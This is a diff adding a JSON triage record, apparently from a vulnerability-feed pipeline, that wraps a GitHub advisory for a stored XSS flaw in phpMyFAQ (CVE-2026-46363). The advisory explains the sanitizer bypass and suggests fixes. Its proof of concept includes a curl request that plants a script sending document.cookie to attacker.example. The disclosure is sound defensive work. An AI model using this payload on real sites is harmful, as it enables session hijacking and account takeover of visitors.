@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46363\", \"cvss\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"## Summary\\n\\nThe FAQ creation and update endpoints in phpMyFAQ apply `FILTER_SANITIZE_SPECIAL_CHARS` (which HTML-encodes input), then immediately call `html_entity_decode()` which reverses the encoding, followed by `Filter::removeAttributes()` which only strips HTML attributes — not tags. This allows `<script>`, `<iframe>`, `<object>`, and `<embed>` tags to be stored in the database and rendered unescaped via `{{ answer|raw }}` and `{{ question|raw }}` in the Twig template, causing JavaScript execution in every visitor's browser.\\n\\n## Details\\n\\n**Vulnerable code path (FAQ create — `FaqController.php`):**\\n\\nAt line 120, the answer content is filtered:\\n```php\\n$content = Filter::filterVar($data->answer, FILTER_SANITIZE_SPECIAL_CHARS);\\n```\\n\\n`Filter::filterVar()` calls `filterSanitizeString()` (`Filter.php:135-144`) which applies `htmlspecialchars()`, converting `<script>` to `&lt;script&gt;`. The regex `/\\\\x00|<[^>]*>?/` then finds no literal angle brackets to strip.\\n\\nAt lines 150-154, the encoded content is decoded and passed to attribute-only sanitization:\\n```php\\n->setAnswer(Filter::removeAttributes(html_entity_decode(\\n    (string) $content,\\n    ENT_QUOTES | ENT_HTML5,\\n    encoding: 'UTF-8',\\n)))\\n```\\n\\n`html_entity_decode()` converts `&lt;script&gt;` back to `<script>`, fully reversing the earlier sanitization. `Filter::removeAttributes()` (`Filter.php:150-196`) only matches and strips `attribute=value` patterns from a known list of HTML attributes (event handlers like `onclick`, `onerror`, etc.) but performs **no tag-level filtering**. A `<script>` tag with no attributes passes through completely unchanged.\\n\\nThe identical pattern exists in the update endpoint at lines 389-398.\\n\\n**Rendering sink (`faq.twig`):**\\n\\n```twig\\n<h2 class=\\\"mb-4 border-bottom\\\">{{ question | raw }}</h2>\\n<article class=\\\"pmf-faq-body pb-4 mb-4 border-bottom\\\">{{ answer|raw }}</article>\\n```\\n\\nThe `|raw` filter disables Twig's auto-escaping, causing the stored `<script>` tag to execute in every visitor's browser.\\n\\nAdditional rendering sinks exist in `search.twig` (line 75, 77) where search results also render FAQ content with `|raw`.\\n\\n## PoC\\n\\n**Prerequisites:** Authenticated session with `FAQ_ADD` permission and a valid CSRF token.\\n\\n**Step 1: Create a malicious FAQ**\\n```bash\\ncurl -X POST 'https://target/admin/api/faq/create' \\\\\\n  -H 'Cookie: PHPSESSID=<admin_session>' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\n    \\\"data\\\": {\\n      \\\"pmf-csrf-token\\\": \\\"<valid_csrf_token>\\\",\\n      \\\"question\\\": \\\"Harmless FAQ Title\\\",\\n      \\\"answer\\\": \\\"Helpful content<script>fetch(\\\\\\\"https://attacker.example/steal?c=\\\\\\\"+document.cookie)</script>\\\",\\n      \\\"categories[]\\\": 1,\\n      \\\"lang\\\": \\\"en\\\",\\n      \\\"tags\\\": \\\"\\\",\\n      \\\"active\\\": \\\"yes\\\",\\n      \\\"sticky\\\": \\\"no\\\",\\n      \\\"keywords\\\": \\\"test\\\",\\n      \\\"author\\\": \\\"Admin\\\",\\n      \\\"email\\\": \\\"admin@example.com\\\",\\n      \\\"comment\\\": \\\"n\\\",\\n      \\\"changed\\\": \\\"Initial\\\",\\n      \\\"notes\\\": \\\"\\\",\\n      \\\"serpTitle\\\": \\\"Harmless FAQ\\\",\\n      \\\"serpDescription\\\": \\\"Test\\\",\\n      \\\"openQuestionId\\\": 0,\\n      \\\"notifyEmail\\\": \\\"\\\",\\n      \\\"notifyUser\\\": \\\"\\\",\\n      \\\"recordDateHandling\\\": \\\"updateDate\\\"\\n    }\\n  }'\\n```\\n\\n**Expected response:** `200 OK` with the new FAQ ID.\\n\\n**Step 2: Verify XSS execution**\\n\\nNavigate to the public FAQ page (e.g., `https://target/content/1/{faqId}/en/harmless-faq-title.html`). The `<script>` tag in the answer body executes, sending the visitor's cookies to the attacker's server.\\n\\n## Impact\\n\\n- **Session hijacking:** An attacker with FAQ creation privileges can steal session cookies from any user (including administrators) who views the FAQ, enabling full account takeover.\\n- **Phishing:** The injected script can modify page content to display fake login forms or redirect users to malicious sites.\\n- **Worm propagation:** If the attacker captures an admin session, they can create additional malicious FAQs automatically, spreading the attack.\\n- **Scope:** Every unauthenticated visitor who views the compromised FAQ is affected. The XSS also fires in search results via `search.twig`.\\n\\n## Recommended Fix\\n\\nReplace the encode→decode→removeAttributes chain with a proper HTML sanitizer that operates on the DOM level. Use a library like [HTML Purifier](http://htmlpurifier.org/) or Symfony's [HtmlSanitizer](https://symfony.com/doc/current/html_sanitizer.html) component.\\n\\n**Immediate fix — add tag-level filtering to `removeAttributes()`** (`Filter.php`):\\n\\n```php\\npublic static function removeAttributes(string $html = ''): string\\n{\\n    // Strip dangerous HTML tags entirely\\n    $dangerousTags = ['script', 'iframe', 'object', 'embed', 'applet', 'form', 'base', 'link', 'meta'];\\n    foreach ($dangerousTags as $tag) {\\n        $html = preg_replace('/<' . $tag . '\\\\b[^>]*>.*?<\\\\/' . $tag . '>/is', '', $html);\\n        $html = preg_replace('/<' . $tag . '\\\\b[^>]*\\\\/?>/is', '', $html);\\n    }\\n\\n    // Also sanitize javascript: URIs in href/src attributes\\n    $html = preg_replace('/\\\\b(href|src)\\\\s*=\\\\s*[\\\"\\\\']?\\\\s*javascript:/i', '$1=\\\"', $html);\\n\\n    $keep = [\\n        'href', 'src', 'title', 'alt', 'class', 'style', 'id',\\n        'name', 'size', 'dir', 'rel', 'rev', 'target', 'width',\\n        'height', 'controls',\\n    ];\\n    // ... rest of existing attribute removal logic\\n```\\n\\n**Recommended long-term fix:** Replace custom sanitization with Symfony's HtmlSanitizer, which is already a project dependency ecosystem:\\n\\n```php\\nuse Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizer;\\nuse Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizerConfig;\\n\\n$config = (new HtmlSanitizerConfig())\\n    ->allowSafeElements()\\n    ->blockElement('script')\\n    ->blockElement('iframe')\\n    ->blockElement('object')\\n    ->blockElement('embed');\\n\\n$sanitizer = new HtmlSanitizer($config);\\n$cleanAnswer = $sanitizer->sanitize($rawAnswer);\\n```\", \"epss\": {\"percentage\": 0.00153, \"percentile\": 0.04788}, \"ghsa_id\": \"GHSA-f5p7-2c9q-8896\", \"github_reviewed_at\": \"2026-05-06T20:18:02Z\", \"html_url\": \"https://github.com/advisories/GHSA-f5p7-2c9q-8896\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-f5p7-2c9q-8896\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46363\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-06T20:18:02Z\", \"references\": [\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-f5p7-2c9q-8896\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46363\", \"https://www.vulncheck.com/advisories/phpmyfaq-stored-xss-in-faq-question-answer-via-encode-decode-bypass\", \"https://github.com/advisories/GHSA-f5p7-2c9q-8896\"], \"repository_advisory_url\": \"https://api.github.com/repos/thorsten/phpMyFAQ/security-advisories/GHSA-f5p7-2c9q-8896\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/thorsten/phpMyFAQ\", \"summary\": \"phpMyFAQ has Stored XSS in FAQ Question/Answer via Encode-Decode Bypass of removeAttributes() Sanitization\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T00:00:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-f5p7-2c9q-8896\", \"vulnerabilities\": [{\"first_patched_version\": \"4.1.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpmyfaq/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.1.1\"}, {\"first_patched_version\": \"4.1.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"thorsten/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.1.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-f5p7-2c9q-8896",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phpmyfaq/phpmyfaq: <= 4.1.1",
+      "thorsten/phpmyfaq: <= 4.1.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-46363"
+    ],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phpmyfaq/phpmyfaq",
+      "thorsten/phpmyfaq"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.895773Z",
+  "provenance": {
+    "content_sha256": "55f30fcb879cf14fd6728042b3efedb7f7f94bad3ba6eb539bddce6d0b86f9e1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-06T20:18:02Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-f5p7-2c9q-8896",
+  "status": "active",
+  "title": "phpMyFAQ has Stored XSS in FAQ Question/Answer via Encode-Decode Bypass of removeAttributes() Sanitization",
+  "updated_at": "2026-06-09T00:00:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-f5p7-2c9q-8896"
+}
